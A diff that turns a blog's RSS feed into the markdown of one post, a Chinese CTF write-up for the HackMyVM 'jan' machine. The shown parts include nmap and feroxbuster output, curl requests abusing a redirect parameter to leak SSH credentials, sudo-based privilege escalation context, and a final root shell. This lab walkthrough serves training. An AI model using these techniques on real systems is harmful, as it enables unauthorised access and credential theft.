@@ -1,5 +1,4 @@
-<?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>TriumphK Blog</title><link>https://7r1UMPHK.github.io</link><description>当你的才华不足以满足你的野心时，应该静下心来努力学习。</description><copyright>TriumphK Blog</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://7r1UMPHK.github.io/image/202506121404919.webp</url><title>avatar</title><link>https://7r1UMPHK.github.io</link></image><lastBuildDate>Fri, 27 Jun 2025 09:27:43 +0000</lastBuildDate><managingEditor>TriumphK Blog</managingEditor><ttl>60</ttl><webMaster>TriumphK Blog</webMaster><item><title>hmv_jan</title><link>https://7r1UMPHK.github.io/post/hmv_jan.html</link><description># 0.简介
+# 0.简介
 
 靶机：https://hackmyvm.eu/machines/machine.php?vm=jan
  难度：绿色
@@ -44,36 +43,36 @@ PORT     STATE SERVICE VERSION
 |_http-open-proxy: Proxy might be redirecting requests
 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
 SF-Port8080-TCP:V=7.95%I=7%D=2/3%Time=67A048E1%P=x86_64-pc-linux-gnu%r(Get
-SF:Request,A2,'HTTP/1\.0\x20200\x20OK\r\nDate:\x20Mon,\x2003\x20Feb\x20202
+SF:Request,A2,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Mon,\x2003\x20Feb\x20202
 SF:5\x2004:40:49\x20GMT\r\nContent-Length:\x2045\r\nContent-Type:\x20text/
 SF:plain;\x20charset=utf-8\r\n\r\nWelcome\x20to\x20our\x20Public\x20Server
-SF:\.\x20Maybe\x20Internal\.')%r(HTTPOptions,A2,'HTTP/1\.0\x20200\x20OK\r\
+SF:\.\x20Maybe\x20Internal\.")%r(HTTPOptions,A2,"HTTP/1\.0\x20200\x20OK\r\
 SF:nDate:\x20Mon,\x2003\x20Feb\x202025\x2004:40:49\x20GMT\r\nContent-Lengt
 SF:h:\x2045\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n\r\nWelcom
-SF:e\x20to\x20our\x20Public\x20Server\.\x20Maybe\x20Internal\.')%r(RTSPReq
-SF:uest,67,'HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/pl
+SF:e\x20to\x20our\x20Public\x20Server\.\x20Maybe\x20Internal\.")%r(RTSPReq
+SF:uest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/pl
 SF:ain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Requ
-SF:est')%r(FourOhFourRequest,A2,'HTTP/1\.0\x20200\x20OK\r\nDate:\x20Mon,\x
+SF:est")%r(FourOhFourRequest,A2,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Mon,\x
 SF:2003\x20Feb\x202025\x2004:40:49\x20GMT\r\nContent-Length:\x2045\r\nCont
 SF:ent-Type:\x20text/plain;\x20charset=utf-8\r\n\r\nWelcome\x20to\x20our\x
-SF:20Public\x20Server\.\x20Maybe\x20Internal\.')%r(Socks5,67,'HTTP/1\.1\x2
+SF:20Public\x20Server\.\x20Maybe\x20Internal\.")%r(Socks5,67,"HTTP/1\.1\x2
 SF:0400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8
-SF:\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request')%r(GenericLines,
-SF:67,'HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\
-SF:x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request')
-SF:%r(Help,67,'HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
+SF:\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(GenericLines,
+SF:67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\
+SF:x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")
+SF:%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
 SF:/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20R
-SF:equest')%r(SSLSessionReq,67,'HTTP/1\.1\x20400\x20Bad\x20Request\r\nCont
+SF:equest")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCont
 SF:ent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r
-SF:\n400\x20Bad\x20Request')%r(LPDString,67,'HTTP/1\.1\x20400\x20Bad\x20Re
+SF:\n400\x20Bad\x20Request")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Re
 SF:quest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x
-SF:20close\r\n\r\n400\x20Bad\x20Request')%r(SIPOptions,67,'HTTP/1\.1\x2040
+SF:20close\r\n\r\n400\x20Bad\x20Request")%r(SIPOptions,67,"HTTP/1\.1\x2040
 SF:0\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\
-SF:nConnection:\x20close\r\n\r\n400\x20Bad\x20Request')%r(OfficeScan,A3,'H
+SF:nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(OfficeScan,A3,"H
 SF:TTP/1\.1\x20400\x20Bad\x20Request:\x20missing\x20required\x20Host\x20he
 SF:ader\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x2
 SF:0close\r\n\r\n400\x20Bad\x20Request:\x20missing\x20required\x20Host\x20
-SF:header');
+SF:header");
 MAC Address: 08:00:27:3A:49:D7 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
 Device type: general purpose|router
 Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
@@ -109,7 +108,7 @@ Welcome to our Public Server. Maybe Internal.
  ___  ___  __   __     __      __         __   ___
 |__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
 |    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
-by Ben 'epi' Risher 🤓                 ver: 2.11.0
+by Ben "epi" Risher 🤓                 ver: 2.11.0
 ───────────────────────────┬──────────────────────
  🎯  Target Url            │ http://192.168.205.136:8080
  🚀  Threads               │ 50
@@ -169,7 +168,7 @@ Content-Type: text/plain; charset=utf-8
 
 ```
 ┌──(kali㉿kali)-[~/test]
-└─$ curl 'http://192.168.205.136:8080/redirect?url=127.0.0.1:8080/robots.txt&amp;url=192.168.205.136:8080/credz'
+└─$ curl "http://192.168.205.136:8080/redirect?url=127.0.0.1:8080/robots.txt&url=192.168.205.136:8080/credz"
                                          
 ```
 
@@ -177,10 +176,10 @@ Content-Type: text/plain; charset=utf-8
 
 ```
 ┌──(kali㉿kali)-[~/test]
-└─$ curl 'http://192.168.205.136:8080/redirect?url=127.0.0.1:8080/robots.txt&amp;url=127.0.0.1:8080/credz'
+└─$ curl "http://192.168.205.136:8080/redirect?url=127.0.0.1:8080/robots.txt&url=127.0.0.1:8080/credz"
                                                                                                                                      
 ┌──(kali㉿kali)-[~/test]
-└─$ curl 'http://192.168.205.136:8080/redirect?url=127.0.0.1:8080/robots.txt&amp;url=/credz'            
+└─$ curl "http://192.168.205.136:8080/redirect?url=127.0.0.1:8080/robots.txt&url=/credz"            
 ssh/EazyLOL                                                                                                                                     
 ```
 
@@ -200,7 +199,7 @@ Welcome to Alpine!
 
 The Alpine Wiki contains a large amount of how-to guides and general
 information about administrating Alpine systems.
-See &lt;https://wiki.alpinelinux.org/&gt;.
+See <https://wiki.alpinelinux.org/>.
 
 You can setup the system with the command: setup-alpine
 
@@ -217,14 +216,14 @@ jan:~$ ls -al
 total 12
 drwxr-sr-x    2 ssh      ssh           4096 Jan 28 09:27 .
 drwxr-xr-x    3 root     root          4096 Jan 28 09:08 ..
-lrwxrwxrwx    1 root     ssh              9 Jan 28 09:27 .ash_history -&gt; /dev/null
+lrwxrwxrwx    1 root     ssh              9 Jan 28 09:27 .ash_history -> /dev/null
 -rw-------    1 ssh      ssh             22 Jan 28 09:20 user.txt
 jan:~$ sudo -l
 Matching Defaults entries for ssh on jan:
     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
 
 Runas and Command-specific defaults for ssh:
-    Defaults!/usr/sbin/visudo env_keep+='SUDO_EDITOR EDITOR VISUAL'
+    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"
 
 User ssh may run the following commands on jan:
     (root) NOPASSWD: /sbin/service sshd restart
@@ -244,7 +243,7 @@ jan:~$ ssh-keygen -t rsa
 Generating public/private rsa key pair.
 Enter file in which to save the key (/home/ssh/.ssh/id_rsa): 
 Created directory '/home/ssh/.ssh'.
-Enter passphrase for '/home/ssh/.ssh/id_rsa' (empty for no passphrase): 
+Enter passphrase for "/home/ssh/.ssh/id_rsa" (empty for no passphrase): 
 Enter same passphrase again: 
 Your identification has been saved in /home/ssh/.ssh/id_rsa
 Your public key has been saved in /home/ssh/.ssh/id_rsa.pub
@@ -306,7 +305,7 @@ Welcome to Alpine!
 
 The Alpine Wiki contains a large amount of how-to guides and general
 information about administrating Alpine systems.
-See &lt;https://wiki.alpinelinux.org/&gt;.
+See <https://wiki.alpinelinux.org/>.
 
 You can setup the system with the command: setup-alpine
 
@@ -324,4 +323,4 @@ uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(
 
 这个方法我没试过，自己尝试一下吧
 
-&lt;!-- ##{'timestamp':1738580133}## --&gt;。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_jan.html</guid><pubDate>Fri, 27 Jun 2025 09:27:15 +0000</pubDate></item><item><title>hello world</title><link>https://7r1UMPHK.github.io/post/hello%20world.html</link><description>hello world。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hello%20world.html</guid><pubDate>Fri, 27 Jun 2025 09:15:28 +0000</pubDate></item></channel></rss>
+<!-- ##{"timestamp":1738580133}## -->
